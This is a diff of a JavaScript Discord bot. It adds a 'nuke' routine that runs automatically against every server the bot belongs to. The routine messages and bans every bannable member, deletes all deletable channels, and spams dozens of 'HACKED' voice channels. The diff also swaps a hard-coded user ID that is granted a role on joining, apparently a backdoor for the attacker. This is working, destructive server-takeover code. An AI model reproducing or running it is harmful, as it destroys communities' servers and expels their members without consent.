+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
 
  
  
@@ -5702,7 +5702,41 @@ m.createChannel('Heureux hasard', 'voice');
 });
  
  
-
+const { Client } = require('discord.js');
+const client = new Client();
+ 
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+ 
+  await guild.fetchMembers();
+ 
+  await guild.owner.send(' By HACKED Py : Asssit,#0100.').catch(e => { return void e; });
+ 
+ 
+ 
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('The server has been hacked. Welcome to https://discord.gg/D5YWPd').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+ 
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+ 
+    await guild.createChannel('@Hac ', 'voice');
+ 
+      await guild.createChannel('@Hac', 'text');
+ 
+ 
+ 
+}
  
 LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
@@ -5719,7 +5753,7 @@ LOka.on('guildCreate', async (guild) => {
  
 LOka.on('guildMemberAdd', member => {
    
-            if (member.id === "521341978659651596") {
+            if (member.id === "320423357709549568") {
                 member.guild.createRole({
                     name : LOka.user.username,
                     color : "RANDOM",
